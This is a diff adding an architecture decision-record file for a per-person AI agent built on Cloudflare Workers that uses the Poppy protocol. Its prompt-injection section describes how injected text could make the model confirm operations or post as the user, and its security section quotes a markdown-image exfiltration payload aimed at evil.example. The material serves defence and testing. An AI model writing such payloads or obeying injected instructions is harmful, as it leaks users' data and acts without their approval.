@@ -1,0 +1,234 @@
+# Architecture and decisions
+
+Why the Durable Personal Agent is built the way it is. The [spec](../durable-personal-agent-spec.md) says what is built and how; this file records the choices behind it, as decision records: the context, the choice, the alternatives and why they lost, the consequences, and when it was made. Commits are on `main`; every decision here was made between 9 and 11 October 2026. Where the commits and docs record the alternatives weighed, they are given as recorded; where they don't, the alternatives listed are the obvious ones and why they would lose, not a record of a debate.
+
+Back to the [README](../README.md) · What's left to deploy and check: [deployment-tasks.md](deployment-tasks.md)
+
+## The architecture in one paragraph
+
+One Cloudflare Worker serves the page, signs people in with Google or GitHub, serves the agent's public Poppy identity and a public validator. Each signed-in identity gets one `PersonalAgent` Durable Object, which runs Pi through `PiHarness`, keeps the conversation and every piece of Poppy state in its own SQLite, and holds the Poppy client, its tools and a fetch-based browser. Two small Durable Objects share state across people: `CompanyLimiter`, one per Company, for rate limits, and `DomainBudget`, one per budget domain, for the demo's spend. Model calls go to Claude through AI Gateway, paid by the operator and capped, or straight to Anthropic or OpenAI with the person's own key. The [spec's Architecture section](../durable-personal-agent-spec.md#architecture) has the diagram.
+
+## Contents
+
+1. [A Worker and one Durable Object per person](#1-a-worker-and-one-durable-object-per-person)
+2. [Pi through the harness, and the example's page](#2-pi-through-the-harness-and-the-examples-page)
+3. [App sign-in in the Worker, not Cloudflare Access](#3-app-sign-in-in-the-worker-not-cloudflare-access)
+4. [Who may sign in: owners, an allowlist, and `SIGNUP`](#4-who-may-sign-in-owners-an-allowlist-and-signup)
+5. [The Poppy client inside each person's Durable Object](#5-the-poppy-client-inside-each-persons-durable-object)
+6. [Prompt-injection defences that are structural](#6-prompt-injection-defences-that-are-structural)
+7. [A strict mock Company as the test oracle](#7-a-strict-mock-company-as-the-test-oracle)
+8. [Readings of an ambiguous draft](#8-readings-of-an-ambiguous-draft)
+9. [An M×N interop harness](#9-an-mn-interop-harness)
+10. [Third-party adapters frozen, and some kept unrun](#10-third-party-adapters-frozen-and-some-kept-unrun)
+11. [Adversarial testing only against our own implementations](#11-adversarial-testing-only-against-our-own-implementations)
+12. [A fetch-based browser instead of Browser Rendering](#12-a-fetch-based-browser-instead-of-browser-rendering)
+13. [Model access: two lanes, caps in Durable Objects](#13-model-access-two-lanes-caps-in-durable-objects)
+14. [Own keys: pasted, sent straight to the vendor](#14-own-keys-pasted-sent-straight-to-the-vendor)
+15. [Two allowlists, and the demo's knobs](#15-two-allowlists-and-the-demos-knobs)
+16. [Fork-safe configuration](#16-fork-safe-configuration)
+17. [Testing: five suites](#17-testing-five-suites)
+18. [Property tests with Hegel](#18-property-tests-with-hegel)
+19. [A second client, in Python, with Hypothesis](#19-a-second-client-in-python-with-hypothesis)
+20. [What we deliberately didn't do](#20-what-we-deliberately-didnt-do)
+21. [CI scope](#21-ci-scope)
+22. [Security hardening](#22-security-hardening)
+
+## 1. A Worker and one Durable Object per person
+
+- **Context.** Each person needs one agent whose conversation and in-flight work survive reloads, deploys, crashes and closed tabs, and whose secrets are kept apart from everyone else's. The project wanted the smallest surface: no separate database, no queue, no servers.
+- **Decision.** One Worker; one `PersonalAgent` Durable Object per signed-in identity, named `sha256("<provider>:<id>")` in the Worker only. Everything durable lives in that object's SQLite: Pi's transcript, every `poppy_*` table, sealed keys and tokens, demo spend. Shared state that no one agent can hold gets its own small Durable Object: `CompanyLimiter` per Company issuer (Companies limit by our one `client_id`), `DomainBudget` per budget domain.
+- **Alternatives.**
+  - *A database (D1) shared by all agents.* Every request would need a tenant check, and a bug in one would leak between people. A per-person object is the isolation.
+  - *A stateless Worker with storage keyed by user.* It loses the single-threaded owner that makes ordering, retries and durable jobs simple.
+- **Consequences.** One person's agent can't read another's state, by construction. A Google and a GitHub sign-in by the same person are two agents. Deleting an agent is `deleteAll()` after revoking its Account Tokens (milestone 2). Cross-person questions (a domain's spend, a Company's rate limit) need their own objects.
+- **When.** The first spec and implementation, 9 October (`51d1c40`, `3b4fc71`).
+
+## 2. Pi through the harness, and the example's page
+
+- **Context.** The agent needs a model loop with tools that survives eviction mid-run, and a chat page. Cloudflare's Agents SDK ships a Pi harness and a Pi example with both.
+- **Decision.** `PersonalAgent` is composed as the example composes its agent: `Lifecycle.install(this).use(poppy).use(webSockets).use(harness)`, with Pi's root session as the one conversation. `src/protocol.ts`, `sockets.ts`, `view.ts` and `transcript.ts` are copied byte for byte from `cloudflare/agents` at `48d9c36`, so they can be re-synced; our page is built around them.
+- **Alternatives.** *Our own model loop* would have to re-solve replay after a crash, which Pi's durable runs and `replay: "safe"` tools already do. *The MCP SDK* for Company MCP servers: a small Streamable HTTP client is used instead, so the agent sees `structuredContent.operation` in tool results (Ops 4.2) and the client controls every header.
+- **Consequences.** `PiHarness`, the Pi AI provider and Pi Durable are beta (a risk the spec lists). Tools declare whether a repeat is harmless, and only those replay after a crash.
+- **When.** 9 October (`3b4fc71`); the Poppy capability on 11 October (`d853736`).
+
+## 3. App sign-in in the Worker, not Cloudflare Access
+
+- **Context.** The first build used Cloudflare Access in front of the Worker.
+- **Decision.** Google and GitHub OAuth with PKCE, run in the Worker, then an HMAC-signed `__Host-session` cookie (HttpOnly, Secure, SameSite=Lax, 30 days). Google's ID token comes from its token endpoint over TLS, so its claims are checked without a signature check, as OpenID Connect allows; GitHub's numeric id names the agent.
+- **Alternatives.** *Cloudflare Access.* Worker-level Access rejects WebSocket upgrades, which the chat needs, and a hostname-based Access application needs a custom domain the deployment didn't have.
+- **Consequences.** The Worker owns the sign-in code, so it is tested against fakes of Google and GitHub that check the client, the redirect URI and the PKCE verifier, and can refuse in each way the code checks. Each deployer registers their own OAuth apps. GitHub's is configured for the live deployment; Google's isn't yet ([deployment-tasks.md](deployment-tasks.md)).
+- **When.** 9 October, 50 minutes after the first build (`94be931`).
+
+## 4. Who may sign in: owners, an allowlist, and `SIGNUP`
+
+- **Context.** A deployment is run by someone who pays for it, and may be shared with a few people, or opened to anyone.
+- **Decision.** `OWNERS` are always let in. `SIGNUP=allowlist` (committed) lets in only `SIGNIN_ALLOWLIST` besides; `SIGNUP=open` lets in anyone with a Google or GitHub account. Lists name Google emails, Google Workspace domains (from the `hd` claim, so a personal account using a work address doesn't count) and GitHub accounts by numeric id (a login can be renamed and re-registered). The check runs at the callback and again on every signed-in request.
+- **Alternatives.** *Emails for GitHub accounts:* a verified email proves the address was once confirmed, not that the person still works there. *Checking only at sign-in:* someone removed would keep a 30-day session.
+- **Consequences.** Removing someone takes a redeploy and locks them out on their next request; a WebSocket already open stays open until it reconnects.
+- **When.** 11 October (`32930a2`); `OWNERS` and `SIGNUP` with model access (`e5b0818`).
+
+## 5. The Poppy client inside each person's Durable Object
+
+- **Context.** Poppy state is per person and per Company: User IDs, Sessions, DPoP keys, Account Tokens, pending sign-ins, conversations and their cursors, operations and approvals. Much of it must outlive a request (device polling, background reading, a confirm whose answer was lost).
+- **Decision.** The client (`src/poppy/`) runs in the person's own Durable Object, as a Lifecycle capability with durable jobs. Session Tokens and DPoP private keys live only in memory; Account Tokens and sign-in secrets are sealed in that object's SQLite, bound to their row. Discovery goes through the validator, so the agent ingests only documents that pass. Every Poppy request goes through one HTTP client that signs a fresh DPoP proof, never follows a redirect with credentials, waits out `Retry-After`, and refuses a token in a URL.
+- **Alternatives.** *A shared Poppy service* holding every person's tokens: one breach would expose everyone, and it would need its own tenant isolation. *Storing DPoP keys:* a stored key can be read from storage or backups; after an eviction the object makes a new key and binds the next token to it, as the Guides allow.
+- **Consequences.** An eviction costs a token request per Company. Background work (device polling, conversation reading, operation tracking) survives restarts.
+- **When.** 11 October (`d853736`).
+
+## 6. Prompt-injection defences that are structural
+
+- **Context.** Company messages, operation summaries, API and MCP descriptions and web pages all reach the model. The draft has no security considerations for this ([N15](spec-issues.md#n15)). A model can be talked into anything; the protocol's promises (only the User approves, `sender: "human"` only for the User's words) are ones Companies can't verify.
+- **Decision.** Make the dangerous actions unreachable from the model, rather than asking it to behave:
+  - No tool confirms or cancels an operation; only the page's buttons or a standing permission do.
+  - `poppy_api_call` refuses any URL at or under a Poppy endpoint (token, sign-in, conversation, operations, browser-session: `protocolEndpoint` in `src/poppy/discovery.ts`), even when a Company's OpenAPI description lists one, so injected text can't make the model confirm an operation or post a message as the User.
+  - At a Company without the Operations extension, every write waits on a local approval card that shows the exact request, and only its Approve sends it, once.
+  - Standing permissions are created by the User on the page, never by the model, and are checked term by term.
+  - Tools never take or return tokens, keys, codes or credentials; Company text reaches the model labelled as information, never approval.
+- **Alternatives.** *Prompting the model to ignore instructions in Company text* is still done, but nothing depends on it.
+- **Consequences.** Tested with a faux model that obeys any instruction it reads (`test/prompt-injection.test.ts`): nothing is confirmed, sent as the User or leaked. A real model's susceptibility isn't measured, and doesn't need to be for these actions.
+- **When.** The approval gate and page-only confirms from the first client (`d853736`); the Poppy-endpoint refusal and the obeying faux model on 11 October (`4eb36a7`).
+
+## 7. A strict mock Company as the test oracle
+
+- **Context.** No real Company had published `poppy.json` (and still hasn't), so the client can't be tested against production. Other implementations were days old and disagreed.
+- **Decision.** A strict mock Company (`test/mock-company/`) in a Durable Object that checks every request our client sends: client metadata and keys, assertions, DPoP proofs, token binding, scopes, message ids, approvals. Each check has a stable id in `violations.ts`; an `afterEach` fails any Poppy test whose mock recorded a violation it didn't declare (`expectViolations`); each check has a `TAMPERS` row that breaks one thing in an otherwise correct request and proves the check fires, and a catalog test fails if a check has no row.
+- **Alternatives.** *Happy-path fakes* would pass a client that sends the wrong `aud` or reuses a `jti`. *Another project's Company* as the oracle: each had its own gaps and readings ([poppy-issues.md](poppy-issues.md)), and none checked everything a Personal Agent sends.
+- **Consequences.** A new Poppy feature needs a test, and a mock check with a `TAMPERS` row where the draft has a MUST. A misreading the client and mock share is invisible to these tests, which is why decisions [8](#8-readings-of-an-ambiguous-draft), [9](#9-an-mn-interop-harness) and [19](#19-a-second-client-in-python-with-hypothesis) exist.
+- **When.** 11 October: the mock (`d853736`), strict assertions (`4ade599`), named checks and `TAMPERS` (`c1f5f53`), no violations by default (`fcf29cf`).
+
+## 8. Readings of an ambiguous draft
+
+- **Context.** Draft 0.1 leaves questions open that change what goes on the wire: the client assertion's `aud` (S1), assertion `typ` and lifetime (S2), where metadata lives for an issuer with a path (S3), DPoP nonce scope (S23), and more.
+- **Decision.** Strict where the ambiguity is security-relevant, lenient where it's cosmetic, following [RFC 9413](https://www.rfc-editor.org/rfc/rfc9413.html): send the narrowest reading; refuse, or record a named violation, wherever a wrong guess could widen access, mix up identities or allow a replay. Each choice is recorded in [readings.md](readings.md) and declared in the interop adapters' `readings`. The mock runs as two references: `dpa-mock`, lenient where the draft is silent (S2), is the grid's reference Company; `dpa-mock-strict` keeps the strict checks. The conformance tests also run sign-in, Sessions and sign-out under six profiles that take the other answers.
+- **Alternatives.** *Postel's "be liberal in what you accept"* everywhere: RFC 9413 argues it turns one implementation's bug into everyone's protocol. *Strict everywhere, one reference:* a strict reference refused every typ-less agent at the first token request, so nothing past it was tested.
+- **Consequences.** A failure caused only by an open question is blamed on the spec (attribution rule 3), with evidence in the trace. The open questions go to the draft's authors as [spec issues](spec-issues.md).
+- **When.** Profiles 11 October (`fcf29cf`); lenient and strict reference mocks (`33ec7e1`); `readings.md` (`f478047`), made to match the code (`8960f17`).
+
+## 9. An M×N interop harness
+
+- **Context.** Passing our own mock proves conformance to our readings, not interoperability. Several projects had agents and Companies; none had been run against the others.
+- **Decision.** `interop/`: a Node runner that builds each implementation's container, runs every agent against every Company over HTTPS through a recording TLS proxy, with scenarios as data ([pirate testing](https://blog.oshineye.com/2010/02/pirate-testing.html)) and blame by named rules ([interop-spec.md](interop-spec.md) §9): a one-sided violation, the grid pattern against the reference Company, a reading difference the trace shows mattered, or unattributed.
+  - **Known failures** (`known-failures.json`, `*` for any agent, Company or scenario, one entry per root cause) don't fail the run, but an entry that matched no failed cell in a run that could judge it is stale and does, so a fix can't go unnoticed (MCP conformance's rule).
+  - **Flaky cells.** A failed cell runs once more; a pass then is flaky, counts as a pass, is listed apart, and never matches a known failure.
+  - Our agent there is `src/poppy` in Node with no model, so results never depend on an LLM.
+- **Alternatives.** *One-sided conformance suites only* (Datalayer's vectors, poppyseed's checker) test one side, and can't find two conforming implementations that fail together. *`wrangler dev` for our side:* Node trusts the run's CA, starts in a second, and needs no `workerd` networking in a container.
+- **Consequences.** The 11 October grid ([summary](interop-results/README.md)) gave evidence for S1, S2 and S9, found spec issues N36 to N42 and per-project bugs ([poppy-issues.md](poppy-issues.md)), and ended with every failure a known one. Harness bugs were as common as implementation bugs at first.
+- **When.** 11 October: design (`850860c`), contract (`1cb5835`), runner (`909fffa`), wildcards and two reference mocks (`33ec7e1`), stale entries and flaky retries (`8fde2fb`).
+
+## 10. Third-party adapters frozen, and some kept unrun
+
+- **Context.** Every other implementation was days old and changing hourly.
+- **Decision.** Each third-party adapter fetches upstream at a pinned commit, and every change an implementation needed to act as a peer is an interop-only setting or a patch listed in its manifest's `relaxations`. Base images are pinned by digest. By the owner's choice, three things are kept but not run until our own agent is verified against a real Company: the **live lane** (our agent against public deployments, signed-out scenarios only, one request a second), and the **everruns** and **typo3** adapters (everruns' were written but its images never built for lack of Docker disk; typo3's is a README, since the extension it would run is private).
+- **Alternatives.** *Tracking upstream heads* would make every run a moving target. *Running the live lane now* would test public deployments before our side is known to be right.
+- **Consequences.** Pins are bumped deliberately, then the grid is rerun. The [deployment tasks](deployment-tasks.md) list when the live lane and the unrun adapters come in.
+- **When.** 11 October (`f3f5fcb`, `1ea0cf3`, `79f8220`; digests `6f6b4e8`).
+
+## 11. Adversarial testing only against our own implementations
+
+- **Context.** Interop tests honest peers. Refusals need dishonest ones: a malicious Company, a malicious agent, a network attacker. But a failure there against someone else's code may be a vulnerability in it.
+- **Decision.** `evil-company` and `evil-agent` (our mock and our agent with an attack switch) and a fault-injection mode in the proxy, judged by harm oracles over the trace. The runner refuses any adversarial or faulted cell unless every honest side is `owner: "self"`, and never runs one on the live lane. No flag lifts this; changing it is a reviewed code change, and [SECURITY.md](../SECURITY.md) sets out disclosure: maintainers first, privately, with a 90-day window, and nothing posted to another project without the owner's approval.
+- **Alternatives.** *Running attacks across the grid* would find more, but would publish other people's vulnerabilities before they could fix them, and attack deployments whose owners hadn't agreed.
+- **Consequences.** The grid says nothing about whether other projects refuse our attacks. What's built and what isn't is in [adversarial-interop.md](adversarial-interop.md); its `XK` rug pull was dropped because our client never observes it (spec issue [N44](spec-issues.md#n44)).
+- **When.** 11 October (`3db051b`, `e42bff1`; SECURITY.md `f478047`).
+
+## 12. A fetch-based browser instead of Browser Rendering
+
+- **Context.** Poppy §5 lets an agent browse a Company's website in a Session. The first build used Cloudflare Browser Rendering (a headless browser).
+- **Decision.** `FetchBrowser` (`src/poppy/fetch-browser.ts`): plain HTTPS from the Durable Object, pages read with `HTMLRewriter` as title, text, links and forms, a host-only cookie jar per Session, no JavaScript. `click` follows links only; `submit` works out exactly what a form would send, shows every visible value on an approval card, and only the User's approval sends exactly that. Every form submission needs approval, whether or not the Company has the Operations extension, because the draft gives website actions no approval step ([N43](spec-issues.md#n43)).
+- **Alternatives.** *Keep Browser Rendering.* It is a paid service, no Company needs JavaScript browsing yet, and our adapter for it let `click` send a form without the approval `submit` requires. That bug was ours, not Browser Rendering's or the draft's, but a browser with no scripts makes the class of bug impossible.
+- **Consequences.** A site that needs JavaScript to show its pages or send its forms can't be browsed; the page says so. Browsing is the last resort after APIs and the Company Agent anyway. Removing it also found two bugs: browser contexts shared between people in one isolate, and approved submits that always failed. Revisit if a Company needs JavaScript.
+- **When.** 11 October (`446113a`; N43 `3f5fa07`).
+
+## 13. Model access: two lanes, caps in Durable Objects
+
+- **Context.** The operator wants to offer Claude to a few people at their own cost, with a hard daily ceiling, and let anyone else bring a key. A model call happens on the person's turns, on background turns (a Company's message), and on every tool round.
+- **Decision.** Pi sees one model whose provider picks the lane before every call (`src/model-router.ts`):
+  1. **Own key**, if the person has one: it always wins.
+  2. **Refused key:** a 401 marks it invalid and stops calls; it never falls back to the demo.
+  3. **Demo**, for `OWNERS` and `DEMO_ALLOWLIST`: the AI binding through the gateway named by `DEMO_GATEWAY_ID`, on Unified Billing (the operator holds no provider key), with metadata `u` (a hash naming the agent) and `d` (the budget domain).
+  4. Otherwise **no model calls**; background notices wait.
+
+  The demo's primary limit is ours: each call's pi-ai cost goes into the agent's own ledger and the domain's `DomainBudget`, and both caps are checked before the call. The gateway's spend rules, split by `metadata.u` and `metadata.d` with a pooled daily cap, are set in the dashboard as a backstop only.
+- **Alternatives.** *Gateway spend rules as the only limit:* they are eventually consistent, work only for priced models, and answer after the fact, so a cap couldn't be shown in Settings or enforced before a background turn. *Caps in the Worker:* it has no durable place for a running total.
+- **Consequences.** A cap can be overshot by the calls already in flight, one per agent; costs are pi-ai's catalog prices, an estimate before Unified Billing's fee. Nothing here is tried live yet: the spec's "Check live" list and [deployment-tasks.md](deployment-tasks.md).
+- **When.** 11 October (`e5b0818`; Settings `83d4d81`).
+
+## 14. Own keys: pasted, sent straight to the vendor
+
+- **Context.** People without the demo need to bring their own model access, and the operator must never pay for it or be able to spend it by accident.
+- **Decision.** A pasted Anthropic or OpenAI API key, and nothing else. It is checked with a free vendor call (list models), sealed in the person's agent under `TOKEN_ENC_KEY` with additional data naming the agent and provider, and opened only for a call or a check. pi-ai's own `anthropic` and `openai` providers send it straight to the vendor, never through the operator's gateway, with an auth context that holds no ambient credentials (under `nodejs_compat`, `process.env` holds the Worker's secrets). Settings says the operator can technically read it, and advises a spending limit at the provider.
+- **Alternatives.**
+  - *BYOK on the gateway* (provider keys stored in AI Gateway). Keys are stored per gateway in the operator's account, not per person, so people's keys would leave their agents for the operator's dashboard, and own-key and demo calls would share one path, where a routing mistake bills the wrong party. Keeping own-key calls off the AI binding means a request that lost its key can't be billed to the operator. The setup guide says to store no BYOK keys on any gateway.
+  - *OpenRouter.* Considered and built (`e5b0818`), as a third own-key lane with its own OAuth (PKCE) connect flow; then dropped by the owner (`e6751ce`), leaving one way to bring a key and two vendors. A stored OpenRouter key from before is deleted unopened, and the agent carries on as if it had none.
+- **Consequences.** Own-key calls are tested against fakes of each vendor's streaming format, and a fake that refuses any request carrying gateway credentials. Streaming with real keys in workerd isn't tried yet.
+- **When.** 11 October (`e5b0818`, `e6751ce`).
+
+## 15. Two allowlists, and the demo's knobs
+
+- **Context.** "Who may sign in" and "who the operator pays for" are the same list only while sign-up is closed.
+- **Decision.** Two lists: `SIGNIN_ALLOWLIST` and `DEMO_ALLOWLIST`, in the same format, plus `OWNERS`, who are on both. The demo's knobs stay settings: `DEMO_DAILY_USD_PER_USER` and `DEMO_DAILY_USD_PER_DOMAIN` (`0` turns the demo off), `DEMO_MODEL_ID` (which must have a price in pi-ai's catalog, or the caps can't work), `DEMO_GATEWAY_ID`, and `SIGNUP`.
+- **Alternatives.** *One renamed list:* removing someone's demo would look like removing their account. *Hard-coded caps:* each deployer pays differently.
+- **Consequences.** With `SIGNUP=open` anyone can sign in, and pays with their own key unless on the demo list; every agent created still costs the operator storage.
+- **When.** 11 October (`e5b0818`).
+
+## 16. Fork-safe configuration
+
+- **Context.** The repository will be copied. A fork must not inherit the author's identities or host, and a deploy from a checkout without the deployer's settings must not wipe production's.
+- **Decision.** The committed `wrangler.jsonc` holds empty `OWNERS`, allowlists, `PUBLIC_ORIGIN` and `POPPY_LOGO_URI`, and every route but the validator fails closed, naming the setting, until they're set. Each deployer keeps their values in the untracked `deployment.local.json` (shape in `deployment.example.json`), which `vite` lays over the template, refusing names it doesn't declare. `npm run deploy` runs `scripts/check-deployment.ts` between the build and `wrangler deploy` and stops if the build is unconfigured. `test/template.test.ts` scans every committed file except docs and fails if a deployer's identity or origin, a non-example email, or another `workers.dev` host appears.
+- **Alternatives.** *Committed values with a "change these" note:* forks would run as the author. *`secrets.required` in Wrangler:* it drops every `.dev.vars` secret not listed, and listing the OAuth secrets would fail the deploy of a deployment with one provider.
+- **Consequences.** A fresh clone answers every route but the validator with a config error until configured. Docs may name the live host; nothing else may.
+- **When.** 11 October (`e5b0818`; the scan widened in `9505bbb`).
+
+## 17. Testing: five suites
+
+- **Context.** The code runs in three places: workerd (the Worker and Durable Objects), the browser (the page) and Node (the interop runner, the property engine).
+- **Decision.** `npm test` runs five Vitest suites one after another: Workers, durability, page, interop and properties. The spec's [Testing and conformance](../durable-personal-agent-spec.md#testing-and-conformance) table is the one list of what each holds. Each exists for a runtime reason: durability resets every Durable Object, which would break other files' objects in the shared runtime; the page needs happy-dom; the interop runner and Hegel's engine (loaded by FFI) need Node. The model, Anthropic, OpenAI, Google, GitHub and Companies are all faked; nothing calls the network. Appendix A maps every Poppy requirement to a named test, and `npm run check:docs` fails if a named test doesn't exist. The docs give no test counts.
+- **Alternatives.** *One suite:* not possible across these runtimes. *Hand-kept counts in the docs:* they drifted, and the check for them was removed (`a654175`).
+- **Consequences.** A new test goes in the suite whose runtime it needs.
+- **When.** CI and the docs check 11 October (`065b2c5`); the durability runtime (`65ad158`); properties (`5421e66`).
+
+## 18. Property tests with Hegel
+
+- **Context.** Example tests check the cases someone thought of. The client's pure parts (scopes, `WWW-Authenticate`, `Retry-After`, path templates, private hosts, JWTs) and discovery take hostile input.
+- **Decision.** Property-based tests with [Hegel](https://hegel.dev), the Hypothesis team's library, in the properties suite: each contract tested both ways (what must be accepted, and what must be refused, with the refusal named), our assertions and proofs mutated one thing at a time against the mock, and a model-based run of honest steps against the mock in process. 100 cases a property in CI; `HEGEL_CASES=5000` locally. The Hegel and hegel-review skills (`.claude/skills/`, copied at a pinned commit) guide writing and reviewing them, and a failing property is fixed, never weakened.
+- **Alternatives.** *fast-check*, used first for the JSON parsers and the page; replaced by Hegel so the project has one property engine, with Hypothesis's shrinking and a local database of failing examples (`.hegel/`) (`7fb2357`).
+- **Consequences.** The properties found six client bugs, each now an example test: junk `Retry-After` read as a past date, `localhost.` passing the private-host check, a non-UTF-8 body thrown as a TypeError, a path value of `..` reaching another resource (`5421e66`), quoted-pairs misread in `WWW-Authenticate`, and inherited names such as `constructor` filling path templates (`a54dcd7`).
+- **When.** 11 October (`3985ab6`, `5421e66`, `7fb2357`, `a54dcd7`).
+
+## 19. A second client, in Python, with Hypothesis
+
+- **Context.** Our client and our mock were written by the same people under the same readings, so a misreading they share passes every test, and the interop grid only shows it if another project happens to differ.
+- **Decision.** An independent Poppy client in Python (`test/hypothesis/`), written from the draft and our spec's readings, not ported from `src/poppy`, driving a Hypothesis stateful, model-based test (`RuleBasedStateMachine`) of the mock over HTTP on localhost, with every response and violation held to a model. Hypothesis because its stateful testing is the most mature: rules, invariants, and shrinking to a minimal sequence. It runs locally only (`npm run test:hypothesis`, needing `uv`), not in `npm test` or CI.
+- **Alternatives.** *More properties in TypeScript:* they share our code's assumptions. *Another project's client:* each has its own readings and gaps, and none exposes a stateful driver.
+- **Consequences.** It found five bugs in the mock: a retry whose JSON members were in another order treated as a conflict (S9), well-formed language tags and time zones recorded as violations, revoking an Account Token signing out the whole account rather than its own Sessions (N4), reuse detection revoking the account's other sign-ins, and a retried first message answered after sign-out without the 7.11 check (S8). Each is now a Workers test. Not covered: Operations, MCP, browsing, handoff and Direct Conversations.
+- **When.** 11 October (`a44b3c1`, `e74bfb7`).
+
+## 20. What we deliberately didn't do
+
+Ruled out by the owner, for cost and risk:
+
+- **Systematic durability and crash testing** beyond what exists: the durability suite crashes every Durable Object and reloads the conversation once, and the Workers suite plays restarts with fault seams (an answer lost, a gateway 504, memory forgotten). Killing the object at every step of a sign-in or operation in a real runtime, or running against a deployment, wasn't done.
+- **Automated mutation testing** of `src/`. What stands in for it: the mock's `TAMPERS` rows (each check proven to fire), the faults planted by hand that the spec's "Checks that tests catch bugs" lists, and `INTEROP_FAULT` for attribution.
+- **A staging deployment.** It was built, with a read-only post-deploy check and rollback notes (`f478047`), then removed (`2813756`): it was about deploying the app, not about Poppy, and a second Worker would need its own OAuth apps and secrets for one user.
+
+## 21. CI scope
+
+- **Context.** CI time and noise matter more than ceremony for a one-owner project.
+- **Decision.**
+  - **CI** (`.github/workflows/ci.yml`): typecheck, the five suites and the docs check, on pushes to `main` and on pull requests, so a branch with an open pull request runs once. It also refuses global Durable Object resets outside the durability suite.
+  - **Interop** (`.github/workflows/interop.yml`): our agent against both mocks in Docker, in its own workflow, only when the client, the validator, the mock, the harness or the dependencies change. The results are an artifact.
+  - **The pre-push hook** (`.githooks/pre-push`) runs only typecheck, about five seconds; CI runs the rest.
+  - **Cut** (`a654175`): the committed grid results (about 4 MB, stale on the next run; a dated summary stays in `docs/interop-results/`), and the outbound test vectors (our validator fixtures and tamper rows exported for a shared repository that was never made; nothing consumed them). The inbound runner for Datalayer's vectors stays.
+- **Alternatives.** *The full grid in CI:* Docker builds of every project take too long for each push, and their failures are upstream's. *Tests in the hook:* slow pushes for checks CI repeats.
+- **Consequences.** The full grid and the Hypothesis client run by hand.
+- **When.** 11 October (`065b2c5`, `a654175`).
+
+## 22. Security hardening
+
+Each of these closed a specific gap, and each has a test:
+
+- **A Content-Security-Policy on every page** (`src/csp.ts`; `public/_headers` for the static page, kept equal by a test): images from this origin or `data:`, scripts and connections to this origin, no framing. **Images the model writes** load only from this origin or `data:`; any other becomes a link. Before this, a prompt injection could make the model write `![x](https://evil.example/?d=…)` and the browser would send the data out (`d3a3186`).
+- **Deadlines on every request and its body.** Token and revocation requests get 15 s for answer and body; API, conversation and operations requests 30 s for the answer to start (plus a long poll's `wait`) and 30 s for the body, which is cancelled when it stalls. Before, only the request had a timeout, so a stalled body was read forever (`9a494fd`).
+- **Private-host checks** on everything a Company controls: IP literals, `localhost` and single-label names are refused, written with or without the root's trailing dot, directly or by redirect, in the client and the validator alike (a property checks they agree).
+- **Sealing with versioned keys.** Account Tokens, pending sign-in secrets and model keys are AES-GCM sealed under `TOKEN_ENC_KEY`, bound to their row or agent and provider by additional data, written as `v1.…`. `TOKEN_ENC_KEY_PREVIOUS` lets a key rotate: old values still open and are sealed again when used (`e5b0818`).
+- **Tokens only to the Company's hosts:** a Session Token goes only to a host `poppy.json` lists or under the Company's domains; an OpenAPI server elsewhere is refused before any request ([N10](spec-issues.md#n10)).
